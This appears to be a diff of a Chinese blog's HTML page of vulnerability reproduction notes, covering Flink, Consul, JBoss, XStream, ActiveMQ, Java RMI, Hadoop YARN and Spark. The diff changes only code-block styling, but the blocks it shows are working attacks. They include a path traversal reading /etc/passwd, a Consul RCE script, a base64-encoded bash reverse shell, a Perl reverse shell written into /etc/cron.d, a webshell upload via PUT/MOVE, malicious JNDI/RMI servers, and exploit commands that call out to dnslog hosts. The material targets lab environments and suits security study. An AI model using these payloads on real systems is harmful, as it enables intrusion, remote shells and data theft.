 <p>列出&#x2F;etc&#x2F;passwd:</p>
-<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;your-ip:8081&#x2F;jobmanager&#x2F;logs&#x2F;..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;your-ip:8081&#x2F;jobmanager&#x2F;logs&#x2F;..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>refer: </p>
 <ul>
@@ -1256,7 +1256,7 @@ success
 <p><strong>前提条件</strong></p>
 <p>启用了脚本检查参数（-enable-script-checks）的所有版本</p>
 <p><strong>环境搭建</strong></p>
-<pre class="language-none"><code class="language-none">1) 下载安装
+<pre class="line-numbers language-none"><code class="language-none">1) 下载安装
 
 下载地址：https:&#x2F;&#x2F;www.consul.io
 
@@ -1316,16 +1316,16 @@ consul_config.json
 
 consul agent -config-dir&#x3D;&#x2F;opt&#x2F;consul.d  -ui -client 0.0.0.0
 
-consul members  # 确认服务状态</code></pre>
+consul members  # 确认服务状态<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>漏洞利用</strong></p>
 <p>漏洞检测</p>
-<pre class="language-none"><code class="language-none">curl --request GET https:&#x2F;&#x2F;192.168.10.6:8500&#x2F;v1&#x2F;agent&#x2F;self
+<pre class="line-numbers language-none"><code class="language-none">curl --request GET https:&#x2F;&#x2F;192.168.10.6:8500&#x2F;v1&#x2F;agent&#x2F;self
 
-# 出现 &quot;EnableRemoteScriptChecks&quot;:true 证明漏洞存在</code></pre>
+# 出现 &quot;EnableRemoteScriptChecks&quot;:true 证明漏洞存在<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>POC</p>
-<pre class="language-none"><code class="language-none">import requests
+<pre class="line-numbers language-none"><code class="language-none">import requests
 import argparse
 from requests.packages import urllib3
 urllib3.disable_warnings()
@@ -1359,10 +1359,10 @@ def check(target_url):
 	
 if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
 	target_url &#x3D; url()
-	check(target_url)</code></pre>
+	check(target_url)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>msf exploit</p>
-<pre class="language-none"><code class="language-none">msf5 &gt; use exploit&#x2F;multi&#x2F;misc&#x2F;consul_service_exec</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">msf5 &gt; use exploit&#x2F;multi&#x2F;misc&#x2F;consul_service_exec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>refer:</p>
 <ul>
@@ -1382,7 +1382,7 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
 <p>工具：<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
 <p>2）序列化数据生成</p>
 <p>使用ysoserial来复现生成序列化数据，选择使用的gadget是CommonsCollections5</p>
-<pre class="language-none"><code class="language-none">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8yMSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8yMSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>3）发送POC</p>
 <p>生成好的POC即为poc.ser，将这个文件作为POST Body发送至&#x2F;invoker&#x2F;readonly即可成功反弹shell</p>
@@ -1407,10 +1407,10 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
 <p>使用vulhub搭建环境，启动一个Springboot + XStream 1.4.15的环境：环境启动后，我们向 <a target="_blank" rel="noopener" href="http://your-ip:8080/">http://your-ip:8080</a> 发送一个正常的XML数据包，将会得到预期返回</p>
 <p>由于目标环境Java版本高于8u191，故使用org.apache.naming.factory.BeanFactory加EL表达式注入的方式来执行任意命令</p>
 <p>使用<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit/">JNDI-Injection-Exploit</a>启动恶意JNDI服务器:</p>
-<pre class="language-none"><code class="language-none">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;touch &#x2F;tmp&#x2F;success&quot; -A 192.168.1.142</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;touch &#x2F;tmp&#x2F;success&quot; -A 192.168.1.142<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>使用上图中基于SpringBoot利用链的RMI地址作为<dataSource>的值，构造POC如下：</dataSource></p>
-<pre class="language-none"><code class="language-none">POST &#x2F; HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F; HTTP&#x2F;1.1
 Host: localhost:8080
 Accept-Encoding: gzip, deflate
 Accept: *&#x2F;*
@@ -1493,7 +1493,7 @@ Content-Length: 3184
       &lt;m__obj class&#x3D;&#39;string&#39;&gt;test&lt;&#x2F;m__obj&gt;
     &lt;&#x2F;value&gt;
   &lt;&#x2F;javax.naming.ldap.Rdn_-RdnEntry&gt;
-&lt;&#x2F;sorted-set&gt;</code></pre>
+&lt;&#x2F;sorted-set&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>其中，evil-ip是恶意RMI服务器的地址。然后，进入目标容器内，可见touch &#x2F;tmp&#x2F;success已成功执行</p>
 <p>实际利用中，如果目标Java版本较低，POC需要做修改，将其中的<code>&lt;__overrideDefaultParser&gt;false&lt;/__overrideDefaultParser&gt;</code>改成 <code>&lt;__useServicesMechanism&gt;false&lt;/__useervicesMechanism&gt;</code>即可</p>
@@ -1511,11 +1511,11 @@ Content-Length: 3184
 <ol>
 <li>使用ysoserial的JRMPListener启动一个恶意的RMI Registry</li>
 </ol>
-<pre class="language-none"><code class="language-none">java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 &quot;touch &#x2F;tmp&#x2F;success&quot;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 &quot;touch &#x2F;tmp&#x2F;success&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>这个RMI Registry在收到请求后，会返回用CommonsCollections6利用链构造的恶意序列化对象</p>
 <p>2）向目标服务器发送CVE-2021-29505的XML POC</p>
-<pre class="language-none"><code class="language-none">POST &#x2F; HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F; HTTP&#x2F;1.1
 Host: your-ip
 Accept-Encoding: gzip, deflate
 Accept: *&#x2F;*
@@ -1579,7 +1579,7 @@ Content-Length: 3169
             &lt;&#x2F;value&gt;
         &lt;&#x2F;javax.naming.ldap.Rdn_-RdnEntry&gt;
     &lt;&#x2F;java.util.PriorityQueue&gt;
-&lt;&#x2F;java.util.PriorityQueue&gt;</code></pre>
+&lt;&#x2F;java.util.PriorityQueue&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>其中，evil-ip是恶意RMI服务器的地址。恶意RMI服务器收到RMI请求</p>
 <p>refer:</p>
@@ -1592,14 +1592,14 @@ Content-Length: 3169
 <p><strong>漏洞复现</strong></p>
 <p>使用vulhub搭建环境，环境运行后，将监听61616和8161两个端口。其中61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口。访问 <a target="_blank" rel="noopener" href="http://your-ip:8161/">http://your-ip:8161</a> 即可看到web管理页面，漏洞不需要web即可利用</p>
 <p><strong>利用过程</strong></p>
-<pre class="language-none"><code class="language-none">1) 构造（可以使用ysoserial）可执行命令的序列化对象
+<pre class="line-numbers language-none"><code class="language-none">1) 构造（可以使用ysoserial）可执行命令的序列化对象
 2) 作为一个消息，发送给目标61616端口
-3) 访问web管理页面，读取消息，触发漏洞</code></pre>
+3) 访问web管理页面，读取消息，触发漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>使用<a target="_blank" rel="noopener" href="https://github.com/matthiaskaiser/jmet">jmet</a>进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹</p>
 <p>jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME</p>
 <p>执行:</p>
-<pre class="language-none"><code class="language-none">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;success&quot; -Yp ROME your-ip 61616</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;success&quot; -Yp ROME your-ip 61616<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>此时会给目标ActiveMQ添加一个名为event的队列，可以通过 <a target="_blank" rel="noopener" href="http://your-ip:8161/admin/browse.jsp?JMSDestination=event">http://your-ip:8161/admin/browse.jsp?JMSDestination=event</a> 看到这个队列中所有消息，点击查看这条消息即可触发命令执行</p>
 <p>refer:</p>
@@ -1612,27 +1612,27 @@ Content-Length: 3169
 <p><strong>背景简述</strong></p>
 <p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。</p>
 <p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：</p>
-<pre class="language-none"><code class="language-none">1. 其使用率并不高
-2. 文件操作容易出现漏洞</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">1. 其使用率并不高
+2. 文件操作容易出现漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf&#x2F;jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用</p>
 <p><strong>漏洞详情</strong></p>
 <p>本漏洞出现在fileserver应用中，漏洞原理就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。</p>
 <p>文件写入有几种利用方法：</p>
-<pre class="language-none"><code class="language-none">1）写入webshell：fileserver不解析jsp，admin和api两个应用都需要登录才能访问，有限制
+<pre class="line-numbers language-none"><code class="language-none">1）写入webshell：fileserver不解析jsp，admin和api两个应用都需要登录才能访问，有限制
 2）写入cron或ssh key等文件：可直接反弹拿shell，也比较方便，缺点是需要root权限
-3）写入jar或jetty.xml等库和配置文件：写入jar，需要jar的后门；写入xml配置文件，需要知道activemq的绝对路径</code></pre>
+3）写入jar或jetty.xml等库和配置文件：写入jar，需要jar的后门；写入xml配置文件，需要知道activemq的绝对路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>环境搭建</strong></p>
 <p>使用vulhub搭建及运行漏洞环境：</p>
-<pre class="language-none"><code class="language-none">docker-compose build
-docker-compose up -d</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">docker-compose build
+docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>环境监听61616端口和8161端口，其中8161为web控制台端口，本漏洞出现在web控制台中。</p>
 <p>访问 <a target="_blank" rel="noopener" href="http://your-ip:8161/">http://your-ip:8161/</a> 看到web页面，说明环境已成功运行</p>
 <p><strong>写入webshell</strong></p>
 <p>默认的ActiveMQ账号密码均为admin，首先访问 <a target="_blank" rel="noopener" href="http://your-ip:8161/admin/test/systemProperties.jsp">http://your-ip:8161/admin/test/systemProperties.jsp</a> ，查看ActiveMQ的绝对路径</p>
 <p>然后上传webshell：</p>
-<pre class="language-none"><code class="language-none">PUT &#x2F;fileserver&#x2F;2.txt HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">PUT &#x2F;fileserver&#x2F;2.txt HTTP&#x2F;1.1
 Host: localhost:8161
 Accept: *&#x2F;*
 Accept-Language: en
@@ -1640,23 +1640,23 @@ User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; 
 Connection: close
 Content-Length: 120976
 
-webshell...</code></pre>
+webshell...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>移动到web目录下的api文件夹（&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;s.jsp）中：</p>
-<pre class="language-none"><code class="language-none">MOVE &#x2F;fileserver&#x2F;2.txt HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">MOVE &#x2F;fileserver&#x2F;2.txt HTTP&#x2F;1.1
 Destination: file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;s.jsp
 Host: localhost:8161
 Accept: *&#x2F;*
 Accept-Language: en
 User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)
 Connection: close
-Content-Length: 0</code></pre>
+Content-Length: 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>登录访问webshell</p>
 <p><strong>写入crontab反弹shell</strong></p>
 <p>前提：需要ActiveMQ是root运行，否则不能写入cron文件</p>
 <p>首先上传cron配置文件（注意，换行一定要\n，不能是\r\n，否则crontab执行会失败）：</p>
-<pre class="language-none"><code class="language-none">PUT &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">PUT &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1
 Host: localhost:8161
 Accept: *&#x2F;*
 Accept-Language: en
@@ -1664,17 +1664,17 @@ User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; 
 Connection: close
 Content-Length: 248
 
-*&#x2F;1 * * * * root &#x2F;usr&#x2F;bin&#x2F;perl -e &#39;use Socket;$i&#x3D;&quot;10.0.0.1&quot;;$p&#x3D;21;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</code></pre>
+*&#x2F;1 * * * * root &#x2F;usr&#x2F;bin&#x2F;perl -e &#39;use Socket;$i&#x3D;&quot;10.0.0.1&quot;;$p&#x3D;21;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>将其移动到&#x2F;etc&#x2F;cron.d&#x2F;root：</p>
-<pre class="language-none"><code class="language-none">MOVE &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">MOVE &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1
 Destination: file:&#x2F;&#x2F;&#x2F;etc&#x2F;cron.d&#x2F;root
 Host: localhost:8161
 Accept: *&#x2F;*
 Accept-Language: en
 User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)
 Connection: close
-Content-Length: 0</code></pre>
+Content-Length: 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>如果上述两个请求都返回204，说明写入成功。等待反弹shell</p>
 <p>refer:</p>
@@ -1687,18 +1687,18 @@ Content-Length: 0</code></pre>
 <p>Java Remote Method Invocation 用于在Java中进行远程调用。RMI存在远程bind的功能(虽然大多数情况不允许远程bind)，在bind过程中，伪造Registry接收到的序列化数据(实现了Remote接口或动态代理了实现了Remote接口的对象)，使Registry在对数据进行反序列化时触发相应的利用链(环境用的是commons-collections:3.2.1)</p>
 <p><strong>漏洞环境</strong></p>
 <p>使用vulhub，执行如下命令编译及启动RMI Registry和服务器：</p>
-<pre class="language-none"><code class="language-none">docker-compose build
-docker-compose run -e RMIIP&#x3D;your-ip -p 1099:1099 rmi</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">docker-compose build
+docker-compose run -e RMIIP&#x3D;your-ip -p 1099:1099 rmi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>其中，your-ip是服务器IP，客户端会根据这个IP来连接服务器。环境启动后，RMI Registry监听在1099端口</p>
 <p><strong>漏洞复现</strong></p>
 <p>通过ysoserial的exploit包中的RMIRegistryExploit进行攻击</p>
-<pre class="language-none"><code class="language-none">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 &quot;curl your-dnslog-server&quot;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 &quot;curl your-dnslog-server&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h3 id="2-Java-RMI-Registry-反序列化漏洞-lt-jdk8u232-b09"><a href="#2-Java-RMI-Registry-反序列化漏洞-lt-jdk8u232-b09" class="headerlink" title="2. Java RMI Registry 反序列化漏洞(&lt;jdk8u232_b09)"></a>2. Java RMI Registry 反序列化漏洞(&lt;jdk8u232_b09)</h3><p><strong>漏洞描述</strong></p>
 <p>Java Remote Method Invocation 用于在Java中进行远程调用。RMI存在远程bind的功能(虽然大多数情况不允许远程bind)，在bind过程中，伪造Registry接收到的序列化数据(实现了Remote接口或动态代理了实现了Remote接口的对象)，使Registry在对数据进行反序列化时触发相应的利用链(环境用的是commons-collections:3.2.1)</p>
 <p>自jdk8u121起，Registry对反序列化的类做了白名单限制</p>
-<pre class="language-none"><code class="language-none">if (String.class &#x3D;&#x3D; clazz
+<pre class="line-numbers language-none"><code class="language-none">if (String.class &#x3D;&#x3D; clazz
         || java.lang.Number.class.isAssignableFrom(clazz)
         || Remote.class.isAssignableFrom(clazz)
         || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)
@@ -1710,16 +1710,16 @@ docker-compose run -e RMIIP&#x3D;your-ip -p 1099:1099 rmi</code></pre>
     return ObjectInputFilter.Status.ALLOWED;
 &#125; else &#123;
     return ObjectInputFilter.Status.REJECTED;
-&#125;</code></pre>
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>refer: <a target="_blank" rel="noopener" href="http://blog.0kami.cn/2020/02/06/rmi-registry-security-problem/">http://blog.0kami.cn/2020/02/06/rmi-registry-security-problem/</a></p>
 <p><strong>漏洞复现</strong></p>
 <p>通过ysoserial的exploit包中的RMIRegistryExploit2或者3进行攻击</p>
-<pre class="language-none"><code class="language-none">&#x2F;&#x2F; 开启JRMPListener
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 开启JRMPListener
 java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 &quot;curl http:&#x2F;&#x2F;xxxxx.burpcollaborator.net&quot;
 
 &#x2F;&#x2F; 发起攻击
-java -cp target&#x2F;ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit2 192.168.31.88 1099 jrmphost 8888</code></pre>
+java -cp target&#x2F;ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit2 192.168.31.88 1099 jrmphost 8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="0x10-Apache-Hadoop-x2F-Spark"><a href="#0x10-Apache-Hadoop-x2F-Spark" class="headerlink" title="0x10 Apache Hadoop&#x2F;Spark"></a>0x10 Apache Hadoop&#x2F;Spark</h2><h3 id="1-Hadoop-YARN-ResourceManager-未授权访问"><a href="#1-Hadoop-YARN-ResourceManager-未授权访问" class="headerlink" title="1. Hadoop YARN ResourceManager 未授权访问"></a>1. Hadoop YARN ResourceManager 未授权访问</h3><p><strong>漏洞描述</strong></p>
 <p>Hadoop是一个由Apache基金会所开发的分布式系统基础架构，YARN是hadoop系统上的资源统一管理平台，其主要作用是实现集群资源的统一管理和调度，可以把MapReduce计算框架作为一个应用程序运行在YARN系统之上，通过YARN来管理资源。</p>
@@ -1728,17 +1728,17 @@ java -cp target&#x2F;ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegis
 <p>使用vulhub搭建环境，环境启动后，访问 <a target="_blank" rel="noopener" href="http://your-ip:8088/">http://your-ip:8088</a> 即可看到Hadoop YARN ResourceManager WebUI页面</p>
 <p><strong>漏洞利用</strong></p>
 <p>利用过程：</p>
-<pre class="language-none"><code class="language-none">1) 在本地监听等待反弹 shell 连接
+<pre class="line-numbers language-none"><code class="language-none">1) 在本地监听等待反弹 shell 连接
 
 2) 调用 New Application API 创建 Application
 
-3) 调用 Submit Application API 提交</code></pre>
+3) 调用 Submit Application API 提交<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>利用<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py">exp</a> 修改lhost反弹shell的IP即可</p>
-<pre class="language-none"><code class="language-none"># 监听666端口，然后运行exp即可收获shell
+<pre class="line-numbers language-none"><code class="language-none"># 监听666端口，然后运行exp即可收获shell
 
 nc -lnvp 6666
-python exploit.py</code></pre>
+python exploit.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>refer: </p>
 <ul>
@@ -1749,18 +1749,18 @@ python exploit.py</code></pre>
 <p>Spark权限设置不当，可能导致攻击者无需认证即可通过该 REST API来操作Spark创建任务、删除任务、查看任务结果等，从而最终获得执行任意指令的能力</p>
 <p><strong>漏洞环境</strong></p>
 <p>使用vulhub，执行如下命令，将以standalone模式启动一个Apache Spark集群，集群里有一个master与一个slave：</p>
-<pre class="language-none"><code class="language-none">docker-compose up -d</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>环境启动后，访问<a target="_blank" rel="noopener" href="http://your-ip:8080/">http://your-ip:8080</a> 即可看到master的管理页面，访问<a target="_blank" rel="noopener" href="http://your-ip:8081/">http://your-ip:8081</a> 即可看到slave的管理页面</p>
 <p><strong>漏洞利用</strong></p>
 <p>该漏洞本质是未授权的用户可以向管理节点提交一个应用（恶意代码）</p>
 <p>提交方式有两种：</p>
-<pre class="language-none"><code class="language-none">1) 利用REST API
+<pre class="line-numbers language-none"><code class="language-none">1) 利用REST API
 
-2) 利用submissions网关（集成在7077端口中）</code></pre>
+2) 利用submissions网关（集成在7077端口中）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>应用可以是Java或Python，就是一个最简单的类:</p>
-<pre class="language-none"><code class="language-none">import java.io.BufferedReader;
+<pre class="line-numbers language-none"><code class="language-none">import java.io.BufferedReader;
 import java.io.InputStreamReader;
 
 public class Exploit &#123;
@@ -1793,12 +1793,12 @@ public class Exploit &#123;
 
     return output.toString();
   &#125;
-&#125;</code></pre>
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>将其编译成JAR，放在任意一个HTTP或FTP上，如<a target="_blank" rel="noopener" href="https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar">https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar</a></p>
 <p><strong>用REST API方式提交应用</strong></p>
 <p>standalone模式下，master将在6066端口启动一个HTTP服务器，向这个端口提交REST格式的API：</p>
-<pre class="language-none"><code class="language-none">POST &#x2F;v1&#x2F;submissions&#x2F;create HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;v1&#x2F;submissions&#x2F;create HTTP&#x2F;1.1
 Host: your-ip:6066
 Accept-Encoding: gzip, deflate
 Accept: *&#x2F;*
@@ -1827,7 +1827,7 @@ Content-Length: 680
     &quot;spark.submit.deployMode&quot;: &quot;cluster&quot;,
     &quot;spark.master&quot;: &quot;spark:&#x2F;&#x2F;your-ip:6066&quot;
   &#125;
-&#125;</code></pre>
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>其中，spark.jars即是编译好的应用，mainClass是待运行的类，appArgs是传给应用的参数</p>
 <p>返回的包中有submissionId，然后访问 <a target="_blank" rel="noopener" href="http://your-ip:8081/logPage/?driverId=%7BsubmissionId%7D&amp;logType=stdout%EF%BC%8C%E5%8D%B3%E5%8F%AF%E6%9F%A5%E7%9C%8B%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C">http://your-ip:8081/logPage/?driverId={submissionId}&amp;logType=stdout，即可查看执行结果</a></p>
@@ -1835,7 +1835,7 @@ Content-Length: 680
 <p><strong>利用submissions网关</strong></p>
 <p>如果6066端口不能访问，或做了权限控制，可以利用master的主端口7077，来提交应用</p>
 <p>方法是利用Apache Spark自带的脚本 bin&#x2F;spark-submit：</p>
-<pre class="language-none"><code class="language-none">bin&#x2F;spark-submit --master spark:&#x2F;&#x2F;your-ip:7077 --deploy-mode cluster --class Exploit https:&#x2F;&#x2F;github.com&#x2F;aRe00t&#x2F;rce-over-spark&#x2F;raw&#x2F;master&#x2F;Exploit.jar id</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">bin&#x2F;spark-submit --master spark:&#x2F;&#x2F;your-ip:7077 --deploy-mode cluster --class Exploit https:&#x2F;&#x2F;github.com&#x2F;aRe00t&#x2F;rce-over-spark&#x2F;raw&#x2F;master&#x2F;Exploit.jar id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
